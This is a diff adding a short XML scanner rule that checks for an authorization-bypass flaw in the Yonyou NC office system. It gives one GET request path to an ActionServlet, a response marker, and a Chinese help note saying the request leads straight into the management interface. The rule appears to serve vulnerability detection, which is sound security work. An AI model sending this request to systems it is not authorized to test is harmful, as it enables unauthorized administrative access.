@@ -1,0 +1,16 @@
+<bpf language=2.0>
+<steps>1</steps>
+   <name>用友NC综合办公系统越权</name>
+   <step1>
+      <method>get</method>
+      <payload>/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID=</payload>
+      <poc>1</poc>
+         <text>iufo/web/images/usericon.gif</text>
+   </step1>
+<help>
+用友NC综合办公系统越权漏洞检测
+
+/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID=
+
+直接进管理界面
+</help>
